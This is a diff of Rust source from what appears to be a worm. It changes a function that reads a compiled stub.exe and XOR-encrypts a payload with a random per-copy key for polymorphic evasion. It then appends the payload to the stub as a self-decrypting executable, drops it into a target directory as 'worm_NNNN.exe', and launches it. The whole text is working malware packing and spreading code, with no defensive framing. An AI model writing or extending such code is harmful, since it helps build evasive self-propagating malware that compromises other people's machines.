@@ -175,40 +175,50 @@ fn custom_loader(packed: &[u8]) -> bool {
 }
 
 fn drop_and_spawn_to_directory(target_dir: &Path, binary: &[u8], verbose: bool) {
-    // Create packed binary with stub + encrypted payload
-    let mut packed_binary = pe_pack(binary);
-
-    // Encrypt only the payload part (after stub), keep stub executable
-    let sig_size = 7; // "PE_PACK"
-    let size_size = 4; // 4 bytes for size
-    let stub_size = packed_binary.len() - binary.len() - sig_size - size_size; // Calculate actual stub size
-    let payload_start = stub_size + sig_size + size_size;
-
-    if packed_binary.len() > payload_start {
-        // Encrypt payload in-place
-        let mut rng = rand::thread_rng();
-        let key: u8 = rng.gen();
-
-        // Store key at the beginning of payload
-        packed_binary[payload_start] = key;
-
-        // Encrypt the rest of payload (skip MZ header preservation since payload isn't executable)
-        for i in (payload_start + 2)..packed_binary.len() {
-            packed_binary[i] ^= key;
+    // Load the compiled stub (must exist for functional executable)
+    let stub_data = match std::fs::read("stub.exe") {
+        Ok(data) => data,
+        Err(_) => {
+            eprintln!("[-] CRITICAL: stub.exe not found! Cannot create functional executable.");
+            eprintln!("    Compile stub.asm first: nasm -f bin stub.asm -o stub.exe");
+            return;
         }
+    };
+
+    // Encrypt the payload with polymorphic key
+    let mut encrypted_payload = binary.to_vec();
+    let mut rng = rand::thread_rng();
+    let key: u8 = rng.gen();
+
+    // Store key at beginning of payload
+    encrypted_payload.insert(0, key);
+
+    // Encrypt payload (skip key byte)
+    for i in 1..encrypted_payload.len() {
+        encrypted_payload[i] ^= key;
     }
 
-    // Fallback to file drop (process injection placeholder for future implementation)
+    // Create final executable: [Stub] + [PE_PACK] + [Size] + [Encrypted Payload]
+    let mut final_executable = stub_data.clone();
+    final_executable.extend_from_slice(b"PE_PACK");
+    final_executable.extend_from_slice(&(encrypted_payload.len() as u32).to_le_bytes());
+    final_executable.extend_from_slice(&encrypted_payload);
+
+    // Generate random filename and write
     let mut rng = rand::thread_rng();
     let random_name = format!("worm_{}.exe", rng.gen_range(1000..10000));
     let target_path = target_dir.join(random_name);
 
-    if std::fs::write(&target_path, &packed_binary).is_ok() {
-        println!("[+] Dropped packed polymorphic executable to: {:?}", target_path);
+    if std::fs::write(&target_path, &final_executable).is_ok() {
+        println!("[+] Dropped functional self-decrypting executable to: {:?}", target_path);
+        println!("[+] Architecture: Stub({} bytes) + Payload({} bytes encrypted)",
+                 stub_data.len(), encrypted_payload.len());
+
+        // Attempt to execute (will work if stub is properly compiled)
         if let Ok(child) = std::process::Command::new(&target_path).spawn() {
-            println!("[+] Spawned process: {}", child.id());
+            println!("[+] Spawned process: {} (Stub will decrypt and execute payload)", child.id());
         } else {
-            println!("[-] Failed to spawn process");
+            println!("[-] Failed to spawn process (Stub may be invalid)");
         }
     } else {
         if verbose {
